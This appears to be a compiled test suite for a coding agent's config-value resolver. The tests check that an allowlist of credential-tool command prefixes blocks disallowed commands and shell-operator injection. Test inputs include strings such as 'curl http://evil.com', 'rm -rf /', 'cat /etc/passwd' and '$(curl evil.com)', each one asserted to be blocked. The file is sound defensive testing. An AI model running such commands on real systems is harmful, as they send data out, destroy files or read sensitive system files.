import { describe, it, beforeEach, afterEach } from "node:test";
import assert from "node:assert/strict";
import {
  resolveConfigValue,
  clearConfigValueCache,
  SAFE_COMMAND_PREFIXES,
  setAllowedCommandPrefixes,
  getAllowedCommandPrefixes
} from "./resolve-config-value.js";
beforeEach(() => {
  clearConfigValueCache();
});
describe("SAFE_COMMAND_PREFIXES", () => {
  it("exports the allowlist array", () => {
    assert.ok(Array.isArray(SAFE_COMMAND_PREFIXES));
    assert.ok(SAFE_COMMAND_PREFIXES.length > 0);
  });
  it("includes expected credential tools", () => {
    assert.ok(SAFE_COMMAND_PREFIXES.includes("pass"));
    assert.ok(SAFE_COMMAND_PREFIXES.includes("op"));
    assert.ok(SAFE_COMMAND_PREFIXES.includes("aws"));
  });
});
describe("resolveConfigValue \u2014 non-command values", () => {
  it("returns the literal value when it does not match an env var", () => {
    const result = resolveConfigValue("my-literal-key");
    assert.equal(result, "my-literal-key");
  });
  it("returns the env var value when the config matches an env var name", () => {
    process.env["TEST_RESOLVE_CONFIG_VAR"] = "env-value";
    const result = resolveConfigValue("TEST_RESOLVE_CONFIG_VAR");
    assert.equal(result, "env-value");
    delete process.env["TEST_RESOLVE_CONFIG_VAR"];
  });
});
describe("resolveConfigValue \u2014 command allowlist enforcement", () => {
  it("blocks a disallowed command and returns undefined", (t) => {
    const stderrChunks = [];
    const originalWrite = process.stderr.write.bind(process.stderr);
    process.stderr.write = (chunk, ...args) => {
      stderrChunks.push(chunk.toString());
      return true;
    };
    t.after(() => {
      process.stderr.write = originalWrite;
    });
    const result = resolveConfigValue("!curl http://evil.com");
    assert.equal(result, void 0);
    assert.ok(stderrChunks.some((line) => line.includes("curl")));
  });
  it("blocks another disallowed command (rm)", () => {
    const result = resolveConfigValue("!rm -rf /tmp/test");
    assert.equal(result, void 0);
  });
  it("blocks a disallowed command with no arguments", () => {
    const result = resolveConfigValue("!wget");
    assert.equal(result, void 0);
  });
  it("allows a safe command prefix to proceed to execution", (t) => {
    const stderrChunks = [];
    const originalWrite = process.stderr.write.bind(process.stderr);
    process.stderr.write = (chunk, ...args) => {
      stderrChunks.push(chunk.toString());
      return true;
    };
    t.after(() => {
      process.stderr.write = originalWrite;
    });
    resolveConfigValue("!pass show nonexistent-entry-for-test");
    const blocked = stderrChunks.some(
      (line) => line.includes("Blocked disallowed command")
    );
    assert.equal(blocked, false, "pass should not be blocked by the allowlist");
  });
});
describe("resolveConfigValue \u2014 shell operator bypass prevention", () => {
  it("blocks semicolon chaining (pass; malicious)", () => {
    const result = resolveConfigValue("!pass show key; curl http://evil.com");
    assert.equal(result, void 0);
  });
  it("blocks pipe operator (pass | evil)", () => {
    const result = resolveConfigValue("!pass show key | cat /etc/passwd");
    assert.equal(result, void 0);
  });
  it("blocks && chaining (pass && evil)", () => {
    const result = resolveConfigValue("!pass show key && rm -rf /");
    assert.equal(result, void 0);
  });
  it("blocks || chaining (pass || evil)", () => {
    const result = resolveConfigValue("!pass show key || curl evil.com");
    assert.equal(result, void 0);
  });
  it("blocks backtick subshell (pass `evil`)", () => {
    const result = resolveConfigValue("!pass show `curl evil.com`");
    assert.equal(result, void 0);
  });
  it("blocks $() subshell (pass $(evil))", () => {
    const result = resolveConfigValue("!pass show $(curl evil.com)");
    assert.equal(result, void 0);
  });
  it("blocks output redirection (pass > file)", () => {
    const result = resolveConfigValue("!pass show key > /tmp/stolen");
    assert.equal(result, void 0);
  });
  it("blocks input redirection (pass < file)", () => {
    const result = resolveConfigValue("!pass show key < /dev/null");
    assert.equal(result, void 0);
  });
  it("writes stderr warning when shell operators detected", (t) => {
    const stderrChunks = [];
    const originalWrite = process.stderr.write.bind(process.stderr);
    process.stderr.write = (chunk, ...args) => {
      stderrChunks.push(chunk.toString());
      return true;
    };
    t.after(() => {
      process.stderr.write = originalWrite;
    });
    resolveConfigValue("!pass show key; curl evil.com");
    assert.ok(stderrChunks.some((line) => line.includes("shell operators")));
  });
});
describe("resolveConfigValue \u2014 caching", () => {
  it("caches the result of a blocked command", (t) => {
    const callCount = { n: 0 };
    const originalWrite = process.stderr.write.bind(process.stderr);
    process.stderr.write = (chunk, ...args) => {
      callCount.n++;
      return true;
    };
    t.after(() => {
      process.stderr.write = originalWrite;
    });
    resolveConfigValue("!curl http://evil.com");
    resolveConfigValue("!curl http://evil.com");
    assert.equal(callCount.n, 1);
  });
  it("clearConfigValueCache resets cached entries", (t) => {
    const stderrChunks = [];
    const originalWrite = process.stderr.write.bind(process.stderr);
    process.stderr.write = (chunk, ...args) => {
      stderrChunks.push(chunk.toString());
      return true;
    };
    t.after(() => {
      process.stderr.write = originalWrite;
    });
    resolveConfigValue("!curl http://evil.com");
    assert.equal(stderrChunks.length, 1);
    clearConfigValueCache();
    resolveConfigValue("!curl http://evil.com");
    assert.equal(stderrChunks.length, 2);
  });
});
describe("REGRESSION #666: non-default credential tool blocked with no override", () => {
  afterEach(() => {
    setAllowedCommandPrefixes(SAFE_COMMAND_PREFIXES);
    clearConfigValueCache();
  });
  it("sops is blocked by default, then unblocked by setAllowedCommandPrefixes", (t) => {
    const stderrChunks = [];
    const originalWrite = process.stderr.write.bind(process.stderr);
    process.stderr.write = (chunk, ...args) => {
      stderrChunks.push(chunk.toString());
      return true;
    };
    t.after(() => {
      process.stderr.write = originalWrite;
    });
    const result = resolveConfigValue("!sops decrypt --output-type json secrets.enc.json");
    assert.equal(result, void 0, "sops is blocked by the hardcoded allowlist");
    assert.ok(
      stderrChunks.some((line) => line.includes('Blocked disallowed command: "sops"')),
      "should log a block message for sops"
    );
    stderrChunks.length = 0;
    clearConfigValueCache();
    setAllowedCommandPrefixes([...SAFE_COMMAND_PREFIXES, "sops"]);
    resolveConfigValue("!sops decrypt --output-type json secrets.enc.json");
    const blockedAfterOverride = stderrChunks.some(
      (line) => line.includes("Blocked disallowed command")
    );
    assert.equal(blockedAfterOverride, false, "sops must not be blocked after override");
  });
});
describe("setAllowedCommandPrefixes \u2014 user override", () => {
  afterEach(() => {
    setAllowedCommandPrefixes(SAFE_COMMAND_PREFIXES);
    clearConfigValueCache();
  });
  it("overrides built-in prefixes with custom list", () => {
    setAllowedCommandPrefixes(["sops", "doppler"]);
    assert.deepEqual([...getAllowedCommandPrefixes()], ["sops", "doppler"]);
  });
  it("custom prefix is allowed through to execution", (t) => {
    const stderrChunks = [];
    const originalWrite = process.stderr.write.bind(process.stderr);
    process.stderr.write = (chunk, ...args) => {
      stderrChunks.push(chunk.toString());
      return true;
    };
    t.after(() => {
      process.stderr.write = originalWrite;
    });
    setAllowedCommandPrefixes(["mycli"]);
    resolveConfigValue("!mycli get-secret");
    const blocked = stderrChunks.some((line) => line.includes("Blocked disallowed command"));
    assert.equal(blocked, false, "mycli should not be blocked when in the custom allowlist");
  });
  it("previously-allowed prefix is blocked after override", (t) => {
    const stderrChunks = [];
    const originalWrite = process.stderr.write.bind(process.stderr);
    process.stderr.write = (chunk, ...args) => {
      stderrChunks.push(chunk.toString());
      return true;
    };
    t.after(() => {
      process.stderr.write = originalWrite;
    });
    setAllowedCommandPrefixes(["sops"]);
    const result = resolveConfigValue("!pass show secret");
    assert.equal(result, void 0);
    const blocked = stderrChunks.some((line) => line.includes("Blocked disallowed command"));
    assert.equal(blocked, true, "pass should be blocked when not in the custom allowlist");
  });
  it("clears cache when overriding prefixes", (t) => {
    const stderrChunks = [];
    const originalWrite = process.stderr.write.bind(process.stderr);
    process.stderr.write = (chunk, ...args) => {
      stderrChunks.push(chunk.toString());
      return true;
    };
    t.after(() => {
      process.stderr.write = originalWrite;
    });
    resolveConfigValue("!mycli get-secret");
    assert.ok(stderrChunks.some((line) => line.includes("Blocked")));
    stderrChunks.length = 0;
    setAllowedCommandPrefixes(["mycli"]);
    resolveConfigValue("!mycli get-secret");
    const blocked = stderrChunks.some((line) => line.includes("Blocked"));
    assert.equal(blocked, false, "Should re-evaluate after allowlist change");
  });
});
//# sourceMappingURL=data:application/json;base64,ewogICJ2ZXJzaW9uIjogMywKICAic291cmNlcyI6IFsiLi4vLi4vLi4vLi4vLi4vcGFja2FnZXMvcGktY29kaW5nLWFnZW50L3NyYy9jb3JlL3Jlc29sdmUtY29uZmlnLXZhbHVlLnRlc3QudHMiXSwKICAic291cmNlc0NvbnRlbnQiOiBbImltcG9ydCB7IGRlc2NyaWJlLCBpdCwgYmVmb3JlRWFjaCwgYWZ0ZXJFYWNoIH0gZnJvbSBcIm5vZGU6dGVzdFwiO1xuaW1wb3J0IGFzc2VydCBmcm9tIFwibm9kZTphc3NlcnQvc3RyaWN0XCI7XG5pbXBvcnQge1xuXHRyZXNvbHZlQ29uZmlnVmFsdWUsXG5cdGNsZWFyQ29uZmlnVmFsdWVDYWNoZSxcblx0U0FGRV9DT01NQU5EX1BSRUZJWEVTLFxuXHRzZXRBbGxvd2VkQ29tbWFuZFByZWZpeGVzLFxuXHRnZXRBbGxvd2VkQ29tbWFuZFByZWZpeGVzLFxufSBmcm9tIFwiLi9yZXNvbHZlLWNvbmZpZy12YWx1ZS5qc1wiO1xuXG5iZWZvcmVFYWNoKCgpID0+IHtcblx0Y2xlYXJDb25maWdWYWx1ZUNhY2hlKCk7XG59KTtcblxuZGVzY3JpYmUoXCJTQUZFX0NPTU1BTkRfUFJFRklYRVNcIiwgKCkgPT4ge1xuXHRpdChcImV4cG9ydHMgdGhlIGFsbG93bGlzdCBhcnJheVwiLCAoKSA9PiB7XG5cdFx0YXNzZXJ0Lm9rKEFycmF5LmlzQXJyYXkoU0FGRV9DT01NQU5EX1BSRUZJWEVTKSk7XG5cdFx0YXNzZXJ0Lm9rKFNBRkVfQ09NTUFORF9QUkVGSVhFUy5sZW5ndGggPiAwKTtcblx0fSk7XG5cblx0aXQoXCJpbmNsdWRlcyBleHBlY3RlZCBjcmVkZW50aWFsIHRvb2xzXCIsICgpID0+IHtcblx0XHRhc3NlcnQub2soU0FGRV9DT01NQU5EX1BSRUZJWEVTLmluY2x1ZGVzKFwicGFzc1wiKSk7XG5cdFx0YXNzZXJ0Lm9rKFNBRkVfQ09NTUFORF9QUkVGSVhFUy5pbmNsdWRlcyhcIm9wXCIpKTtcblx0XHRhc3NlcnQub2soU0FGRV9DT01NQU5EX1BSRUZJWEVTLmluY2x1ZGVzKFwiYXdzXCIpKTtcblx0fSk7XG59KTtcblxuZGVzY3JpYmUoXCJyZXNvbHZlQ29uZmlnVmFsdWUgXHUyMDE0IG5vbi1jb21tYW5kIHZhbHVlc1wiLCAoKSA9PiB7XG5cdGl0KFwicmV0dXJucyB0aGUgbGl0ZXJhbCB2YWx1ZSB3aGVuIGl0IGRvZXMgbm90IG1hdGNoIGFuIGVudiB2YXJcIiwgKCkgPT4ge1xuXHRcdGNvbnN0IHJlc3VsdCA9IHJlc29sdmVDb25maWdWYWx1ZShcIm15LWxpdGVyYWwta2V5XCIpO1xuXHRcdGFzc2VydC5lcXVhbChyZXN1bHQsIFwibXktbGl0ZXJhbC1rZXlcIik7XG5cdH0pO1xuXG5cdGl0KFwicmV0dXJucyB0aGUgZW52IHZhciB2YWx1ZSB3aGVuIHRoZSBjb25maWcgbWF0Y2hlcyBhbiBlbnYgdmFyIG5hbWVcIiwgKCkgPT4ge1xuXHRcdHByb2Nlc3MuZW52W1wiVEVTVF9SRVNPTFZFX0NPTkZJR19WQVJcIl0gPSBcImVudi12YWx1ZVwiO1xuXHRcdGNvbnN0IHJlc3VsdCA9IHJlc29sdmVDb25maWdWYWx1ZShcIlRFU1RfUkVTT0xWRV9DT05GSUdfVkFSXCIpO1xuXHRcdGFzc2VydC5lcXVhbChyZXN1bHQsIFwiZW52LXZhbHVlXCIpO1xuXHRcdGRlbGV0ZSBwcm9jZXNzLmVudltcIlRFU1RfUkVTT0xWRV9DT05GSUdfVkFSXCJdO1xuXHR9KTtcbn0pO1xuXG5kZXNjcmliZShcInJlc29sdmVDb25maWdWYWx1ZSBcdTIwMTQgY29tbWFuZCBhbGxvd2xpc3QgZW5mb3JjZW1lbnRcIiwgKCkgPT4ge1xuXHRpdChcImJsb2NrcyBhIGRpc2FsbG93ZWQgY29tbWFuZCBhbmQgcmV0dXJucyB1bmRlZmluZWRcIiwgKHQpID0+IHtcblx0XHRjb25zdCBzdGRlcnJDaHVua3M6IHN0cmluZ1tdID0gW107XG5cdFx0Y29uc3Qgb3JpZ2luYWxXcml0ZSA9IHByb2Nlc3Muc3RkZXJyLndyaXRlLmJpbmQocHJvY2Vzcy5zdGRlcnIpO1xuXHRcdHByb2Nlc3Muc3RkZXJyLndyaXRlID0gKGNodW5rOiBzdHJpbmcgfCBVaW50OEFycmF5LCAuLi5hcmdzOiB1bmtub3duW10pID0+IHtcblx0XHRcdHN0ZGVyckNodW5rcy5wdXNoKGNodW5rLnRvU3RyaW5nKCkpO1xuXHRcdFx0cmV0dXJuIHRydWU7XG5cdFx0fTtcblx0XHR0LmFmdGVyKCgpID0+IHtcblx0XHRcdHByb2Nlc3Muc3RkZXJyLndyaXRlID0gb3JpZ2luYWxXcml0ZTtcblx0XHR9KTtcblxuXHRcdGNvbnN0IHJlc3VsdCA9IHJlc29sdmVDb25maWdWYWx1ZShcIiFjdXJsIGh0dHA6Ly9ldmlsLmNvbVwiKTtcblx0XHRhc3NlcnQuZXF1YWwocmVzdWx0LCB1bmRlZmluZWQpO1xuXHRcdGFzc2VydC5vayhzdGRlcnJDaHVua3Muc29tZSgobGluZSkgPT4gbGluZS5pbmNsdWRlcyhcImN1cmxcIikpKTtcblx0fSk7XG5cblx0aXQoXCJibG9ja3MgYW5vdGhlciBkaXNhbGxvd2VkIGNvbW1hbmQgKHJtKVwiLCAoKSA9PiB7XG5cdFx0Y29uc3QgcmVzdWx0ID0gcmVzb2x2ZUNvbmZpZ1ZhbHVlKFwiIXJtIC1yZiAvdG1wL3Rlc3RcIik7XG5cdFx0YXNzZXJ0LmVxdWFsKHJlc3VsdCwgdW5kZWZpbmVkKTtcblx0fSk7XG5cblx0aXQoXCJibG9ja3MgYSBkaXNhbGxvd2VkIGNvbW1hbmQgd2l0aCBubyBhcmd1bWVudHNcIiwgKCkgPT4ge1xuXHRcdGNvbnN0IHJlc3VsdCA9IHJlc29sdmVDb25maWdWYWx1ZShcIiF3Z2V0XCIpO1xuXHRcdGFzc2VydC5lcXVhbChyZXN1bHQsIHVuZGVmaW5lZCk7XG5cdH0pO1xuXG5cdGl0KFwiYWxsb3dzIGEgc2FmZSBjb21tYW5kIHByZWZpeCB0byBwcm9jZWVkIHRvIGV4ZWN1dGlvblwiLCAodCkgPT4ge1xuXHRcdC8vIGBwYXNzYCBpcyB1bmxpa2VseSB0byBiZSBpbnN0YWxsZWQgaW4gQ0ksIHNvIHdlIGp1c3QgdmVyaWZ5IGl0IGRvZXMgTk9UXG5cdFx0Ly8gcmV0dXJuIHVuZGVmaW5lZCBkdWUgdG8gdGhlIGFsbG93bGlzdCBjaGVjayBcdTIwMTQgaXQgbWF5IHJldHVybiB1bmRlZmluZWQgaWZcblx0XHQvLyB0aGUgYmluYXJ5IGlzIGFic2VudCwgYnV0IHRoZSBibG9jayBwYXRoIG11c3Qgbm90IGJlIHRha2VuLlxuXHRcdC8vIFdlIGNvbmZpcm0gYnkgY2hlY2tpbmcgbm8gXCJCbG9ja2VkXCIgbWVzc2FnZSBhcHBlYXJzIG9uIHN0ZGVyci5cblx0XHRjb25zdCBzdGRlcnJDaHVua3M6IHN0cmluZ1tdID0gW107XG5cdFx0Y29uc3Qgb3JpZ2luYWxXcml0ZSA9IHByb2Nlc3Muc3RkZXJyLndyaXRlLmJpbmQocHJvY2Vzcy5zdGRlcnIpO1xuXHRcdHByb2Nlc3Muc3RkZXJyLndyaXRlID0gKGNodW5rOiBzdHJpbmcgfCBVaW50OEFycmF5LCAuLi5hcmdzOiB1bmtub3duW10pID0+IHtcblx0XHRcdHN0ZGVyckNodW5rcy5wdXNoKGNodW5rLnRvU3RyaW5nKCkpO1xuXHRcdFx0cmV0dXJuIHRydWU7XG5cdFx0fTtcblx0XHR0LmFmdGVyKCgpID0+IHtcblx0XHRcdHByb2Nlc3Muc3RkZXJyLndyaXRlID0gb3JpZ2luYWxXcml0ZTtcblx0XHR9KTtcblxuXHRcdHJlc29sdmVDb25maWdWYWx1ZShcIiFwYXNzIHNob3cgbm9uZXhpc3RlbnQtZW50cnktZm9yLXRlc3RcIik7XG5cdFx0Y29uc3QgYmxvY2tlZCA9IHN0ZGVyckNodW5rcy5zb21lKChsaW5lKSA9PlxuXHRcdFx0bGluZS5pbmNsdWRlcyhcIkJsb2NrZWQgZGlzYWxsb3dlZCBjb21tYW5kXCIpXG5cdFx0KTtcblx0XHRhc3NlcnQuZXF1YWwoYmxvY2tlZCwgZmFsc2UsIFwicGFzcyBzaG91bGQgbm90IGJlIGJsb2NrZWQgYnkgdGhlIGFsbG93bGlzdFwiKTtcblx0fSk7XG59KTtcblxuZGVzY3JpYmUoXCJyZXNvbHZlQ29uZmlnVmFsdWUgXHUyMDE0IHNoZWxsIG9wZXJhdG9yIGJ5cGFzcyBwcmV2ZW50aW9uXCIsICgpID0+IHtcblx0aXQoXCJibG9ja3Mgc2VtaWNvbG9uIGNoYWluaW5nIChwYXNzOyBtYWxpY2lvdXMpXCIsICgpID0+IHtcblx0XHRjb25zdCByZXN1bHQgPSByZXNvbHZlQ29uZmlnVmFsdWUoXCIhcGFzcyBzaG93IGtleTsgY3VybCBodHRwOi8vZXZpbC5jb21cIik7XG5cdFx0YXNzZXJ0LmVxdWFsKHJlc3VsdCwgdW5kZWZpbmVkKTtcblx0fSk7XG5cblx0aXQoXCJibG9ja3MgcGlwZSBvcGVyYXRvciAocGFzcyB8IGV2aWwpXCIsICgpID0+IHtcblx0XHRjb25zdCByZXN1bHQgPSByZXNvbHZlQ29uZmlnVmFsdWUoXCIhcGFzcyBzaG93IGtleSB8IGNhdCAvZXRjL3Bhc3N3ZFwiKTtcblx0XHRhc3NlcnQuZXF1YWwocmVzdWx0LCB1bmRlZmluZWQpO1xuXHR9KTtcblxuXHRpdChcImJsb2NrcyAmJiBjaGFpbmluZyAocGFzcyAmJiBldmlsKVwiLCAoKSA9PiB7XG5cdFx0Y29uc3QgcmVzdWx0ID0gcmVzb2x2ZUNvbmZpZ1ZhbHVlKFwiIXBhc3Mgc2hvdyBrZXkgJiYgcm0gLXJmIC9cIik7XG5cdFx0YXNzZXJ0LmVxdWFsKHJlc3VsdCwgdW5kZWZpbmVkKTtcblx0fSk7XG5cblx0aXQoXCJibG9ja3MgfHwgY2hhaW5pbmcgKHBhc3MgfHwgZXZpbClcIiwgKCkgPT4ge1xuXHRcdGNvbnN0IHJlc3VsdCA9IHJlc29sdmVDb25maWdWYWx1ZShcIiFwYXNzIHNob3cga2V5IHx8IGN1cmwgZXZpbC5jb21cIik7XG5cdFx0YXNzZXJ0LmVxdWFsKHJlc3VsdCwgdW5kZWZpbmVkKTtcblx0fSk7XG5cblx0aXQoXCJibG9ja3MgYmFja3RpY2sgc3Vic2hlbGwgKHBhc3MgYGV2aWxgKVwiLCAoKSA9PiB7XG5cdFx0Y29uc3QgcmVzdWx0ID0gcmVzb2x2ZUNvbmZpZ1ZhbHVlKFwiIXBhc3Mgc2hvdyBgY3VybCBldmlsLmNvbWBcIik7XG5cdFx0YXNzZXJ0LmVxdWFsKHJlc3VsdCwgdW5kZWZpbmVkKTtcblx0fSk7XG5cblx0aXQoXCJibG9ja3MgJCgpIHN1YnNoZWxsIChwYXNzICQoZXZpbCkpXCIsICgpID0+IHtcblx0XHRjb25zdCByZXN1bHQgPSByZXNvbHZlQ29uZmlnVmFsdWUoXCIhcGFzcyBzaG93ICQoY3VybCBldmlsLmNvbSlcIik7XG5cdFx0YXNzZXJ0LmVxdWFsKHJlc3VsdCwgdW5kZWZpbmVkKTtcblx0fSk7XG5cblx0aXQoXCJibG9ja3Mgb3V0cHV0IHJlZGlyZWN0aW9uIChwYXNzID4gZmlsZSlcIiwgKCkgPT4ge1xuXHRcdGNvbnN0IHJlc3VsdCA9IHJlc29sdmVDb25maWdWYWx1ZShcIiFwYXNzIHNob3cga2V5ID4gL3RtcC9zdG9sZW5cIik7XG5cdFx0YXNzZXJ0LmVxdWFsKHJlc3VsdCwgdW5kZWZpbmVkKTtcblx0fSk7XG5cblx0aXQoXCJibG9ja3MgaW5wdXQgcmVkaXJlY3Rpb24gKHBhc3MgPCBmaWxlKVwiLCAoKSA9PiB7XG5cdFx0Y29uc3QgcmVzdWx0ID0gcmVzb2x2ZUNvbmZpZ1ZhbHVlKFwiIXBhc3Mgc2hvdyBrZXkgPCAvZGV2L251bGxcIik7XG5cdFx0YXNzZXJ0LmVxdWFsKHJlc3VsdCwgdW5kZWZpbmVkKTtcblx0fSk7XG5cblx0aXQoXCJ3cml0ZXMgc3RkZXJyIHdhcm5pbmcgd2hlbiBzaGVsbCBvcGVyYXRvcnMgZGV0ZWN0ZWRcIiwgKHQpID0+IHtcblx0XHRjb25zdCBzdGRlcnJDaHVua3M6IHN0cmluZ1tdID0gW107XG5cdFx0Y29uc3Qgb3JpZ2luYWxXcml0ZSA9IHByb2Nlc3Muc3RkZXJyLndyaXRlLmJpbmQocHJvY2Vzcy5zdGRlcnIpO1xuXHRcdHByb2Nlc3Muc3RkZXJyLndyaXRlID0gKGNodW5rOiBzdHJpbmcgfCBVaW50OEFycmF5LCAuLi5hcmdzOiB1bmtub3duW10pID0+IHtcblx0XHRcdHN0ZGVyckNodW5rcy5wdXNoKGNodW5rLnRvU3RyaW5nKCkpO1xuXHRcdFx0cmV0dXJuIHRydWU7XG5cdFx0fTtcblx0XHR0LmFmdGVyKCgpID0+IHtcblx0XHRcdHByb2Nlc3Muc3RkZXJyLndyaXRlID0gb3JpZ2luYWxXcml0ZTtcblx0XHR9KTtcblxuXHRcdHJlc29sdmVDb25maWdWYWx1ZShcIiFwYXNzIHNob3cga2V5OyBjdXJsIGV2aWwuY29tXCIpO1xuXHRcdGFzc2VydC5vayhzdGRlcnJDaHVua3Muc29tZSgobGluZSkgPT4gbGluZS5pbmNsdWRlcyhcInNoZWxsIG9wZXJhdG9yc1wiKSkpO1xuXHR9KTtcbn0pO1xuXG5kZXNjcmliZShcInJlc29sdmVDb25maWdWYWx1ZSBcdTIwMTQgY2FjaGluZ1wiLCAoKSA9PiB7XG5cdGl0KFwiY2FjaGVzIHRoZSByZXN1bHQgb2YgYSBibG9ja2VkIGNvbW1hbmRcIiwgKHQpID0+IHtcblx0XHRjb25zdCBjYWxsQ291bnQgPSB7IG46IDAgfTtcblx0XHRjb25zdCBvcmlnaW5hbFdyaXRlID0gcHJvY2Vzcy5zdGRlcnIud3JpdGUuYmluZChwcm9jZXNzLnN0ZGVycik7XG5cdFx0cHJvY2Vzcy5zdGRlcnIud3JpdGUgPSAoY2h1bms6IHN0cmluZyB8IFVpbnQ4QXJyYXksIC4uLmFyZ3M6IHVua25vd25bXSkgPT4ge1xuXHRcdFx0Y2FsbENvdW50Lm4rKztcblx0XHRcdHJldHVybiB0cnVlO1xuXHRcdH07XG5cdFx0dC5hZnRlcigoKSA9PiB7XG5cdFx0XHRwcm9jZXNzLnN0ZGVyci53cml0ZSA9IG9yaWdpbmFsV3JpdGU7XG5cdFx0fSk7XG5cblx0XHRyZXNvbHZlQ29uZmlnVmFsdWUoXCIhY3VybCBodHRwOi8vZXZpbC5jb21cIik7XG5cdFx0cmVzb2x2ZUNvbmZpZ1ZhbHVlKFwiIWN1cmwgaHR0cDovL2V2aWwuY29tXCIpO1xuXHRcdC8vIFRoZSBibG9jayB3YXJuaW5nIHNob3VsZCBvbmx5IGZpcmUgb25jZTsgdGhlIHNlY29uZCBjYWxsIGhpdHMgdGhlIGNhY2hlXG5cdFx0Ly8gYmVmb3JlIHJlYWNoaW5nIHRoZSBhbGxvd2xpc3QgY2hlY2ssIHNvIHN0ZGVyciBjb3VudCBpcyAxLlxuXHRcdGFzc2VydC5lcXVhbChjYWxsQ291bnQubiwgMSk7XG5cdH0pO1xuXG5cdGl0KFwiY2xlYXJDb25maWdWYWx1ZUNhY2hlIHJlc2V0cyBjYWNoZWQgZW50cmllc1wiLCAodCkgPT4ge1xuXHRcdGNvbnN0IHN0ZGVyckNodW5rczogc3RyaW5nW10gPSBbXTtcblx0XHRjb25zdCBvcmlnaW5hbFdyaXRlID0gcHJvY2Vzcy5zdGRlcnIud3JpdGUuYmluZChwcm9jZXNzLnN0ZGVycik7XG5cdFx0cHJvY2Vzcy5zdGRlcnIud3JpdGUgPSAoY2h1bms6IHN0cmluZyB8IFVpbnQ4QXJyYXksIC4uLmFyZ3M6IHVua25vd25bXSkgPT4ge1xuXHRcdFx0c3RkZXJyQ2h1bmtzLnB1c2goY2h1bmsudG9TdHJpbmcoKSk7XG5cdFx0XHRyZXR1cm4gdHJ1ZTtcblx0XHR9O1xuXHRcdHQuYWZ0ZXIoKCkgPT4ge1xuXHRcdFx0cHJvY2Vzcy5zdGRlcnIud3JpdGUgPSBvcmlnaW5hbFdyaXRlO1xuXHRcdH0pO1xuXG5cdFx0cmVzb2x2ZUNvbmZpZ1ZhbHVlKFwiIWN1cmwgaHR0cDovL2V2aWwuY29tXCIpO1xuXHRcdGFzc2VydC5lcXVhbChzdGRlcnJDaHVua3MubGVuZ3RoLCAxKTtcblxuXHRcdGNsZWFyQ29uZmlnVmFsdWVDYWNoZSgpO1xuXG5cdFx0cmVzb2x2ZUNvbmZpZ1ZhbHVlKFwiIWN1cmwgaHR0cDovL2V2aWwuY29tXCIpO1xuXHRcdGFzc2VydC5lcXVhbChzdGRlcnJDaHVua3MubGVuZ3RoLCAyKTtcblx0fSk7XG59KTtcblxuZGVzY3JpYmUoXCJSRUdSRVNTSU9OICM2NjY6IG5vbi1kZWZhdWx0IGNyZWRlbnRpYWwgdG9vbCBibG9ja2VkIHdpdGggbm8gb3ZlcnJpZGVcIiwgKCkgPT4ge1xuXHRhZnRlckVhY2goKCkgPT4ge1xuXHRcdHNldEFsbG93ZWRDb21tYW5kUHJlZml4ZXMoU0FGRV9DT01NQU5EX1BSRUZJWEVTKTtcblx0XHRjbGVhckNvbmZpZ1ZhbHVlQ2FjaGUoKTtcblx0fSk7XG5cblx0aXQoXCJzb3BzIGlzIGJsb2NrZWQgYnkgZGVmYXVsdCwgdGhlbiB1bmJsb2NrZWQgYnkgc2V0QWxsb3dlZENvbW1hbmRQcmVmaXhlc1wiLCAodCkgPT4ge1xuXHRcdGNvbnN0IHN0ZGVyckNodW5rczogc3RyaW5nW10gPSBbXTtcblx0XHRjb25zdCBvcmlnaW5hbFdyaXRlID0gcHJvY2Vzcy5zdGRlcnIud3JpdGUuYmluZChwcm9jZXNzLnN0ZGVycik7XG5cdFx0cHJvY2Vzcy5zdGRlcnIud3JpdGUgPSAoY2h1bms6IHN0cmluZyB8IFVpbnQ4QXJyYXksIC4uLmFyZ3M6IHVua25vd25bXSkgPT4ge1xuXHRcdFx0c3RkZXJyQ2h1bmtzLnB1c2goY2h1bmsudG9TdHJpbmcoKSk7XG5cdFx0XHRyZXR1cm4gdHJ1ZTtcblx0XHR9O1xuXHRcdHQuYWZ0ZXIoKCkgPT4ge1xuXHRcdFx0cHJvY2Vzcy5zdGRlcnIud3JpdGUgPSBvcmlnaW5hbFdyaXRlO1xuXHRcdH0pO1xuXG5cdFx0Ly8gQnVnOiBzb3BzIGlzIG5vdCBpbiBTQUZFX0NPTU1BTkRfUFJFRklYRVMsIHNvIGl0J3MgYmxvY2tlZFxuXHRcdGNvbnN0IHJlc3VsdCA9IHJlc29sdmVDb25maWdWYWx1ZShcIiFzb3BzIGRlY3J5cHQgLS1vdXRwdXQtdHlwZSBqc29uIHNlY3JldHMuZW5jLmpzb25cIik7XG5cdFx0YXNzZXJ0LmVxdWFsKHJlc3VsdCwgdW5kZWZpbmVkLCBcInNvcHMgaXMgYmxvY2tlZCBieSB0aGUgaGFyZGNvZGVkIGFsbG93bGlzdFwiKTtcblx0XHRhc3NlcnQub2soXG5cdFx0XHRzdGRlcnJDaHVua3Muc29tZSgobGluZSkgPT4gbGluZS5pbmNsdWRlcygnQmxvY2tlZCBkaXNhbGxvd2VkIGNvbW1hbmQ6IFwic29wc1wiJykpLFxuXHRcdFx0XCJzaG91bGQgbG9nIGEgYmxvY2sgbWVzc2FnZSBmb3Igc29wc1wiLFxuXHRcdCk7XG5cblx0XHRzdGRlcnJDaHVua3MubGVuZ3RoID0gMDtcblx0XHRjbGVhckNvbmZpZ1ZhbHVlQ2FjaGUoKTtcblxuXHRcdC8vIEZpeDogb3ZlcnJpZGUgdGhlIGFsbG93bGlzdCB0byBpbmNsdWRlIHNvcHNcblx0XHRzZXRBbGxvd2VkQ29tbWFuZFByZWZpeGVzKFsuLi5TQUZFX0NPTU1BTkRfUFJFRklYRVMsIFwic29wc1wiXSk7XG5cdFx0cmVzb2x2ZUNvbmZpZ1ZhbHVlKFwiIXNvcHMgZGVjcnlwdCAtLW91dHB1dC10eXBlIGpzb24gc2VjcmV0cy5lbmMuanNvblwiKTtcblxuXHRcdGNvbnN0IGJsb2NrZWRBZnRlck92ZXJyaWRlID0gc3RkZXJyQ2h1bmtzLnNvbWUoKGxpbmUpID0+XG5cdFx0XHRsaW5lLmluY2x1ZGVzKFwiQmxvY2tlZCBkaXNhbGxvd2VkIGNvbW1hbmRcIiksXG5cdFx0KTtcblx0XHRhc3NlcnQuZXF1YWwoYmxvY2tlZEFmdGVyT3ZlcnJpZGUsIGZhbHNlLCBcInNvcHMgbXVzdCBub3QgYmUgYmxvY2tlZCBhZnRlciBvdmVycmlkZVwiKTtcblx0fSk7XG59KTtcblxuZGVzY3JpYmUoXCJzZXRBbGxvd2VkQ29tbWFuZFByZWZpeGVzIFx1MjAxNCB1c2VyIG92ZXJyaWRlXC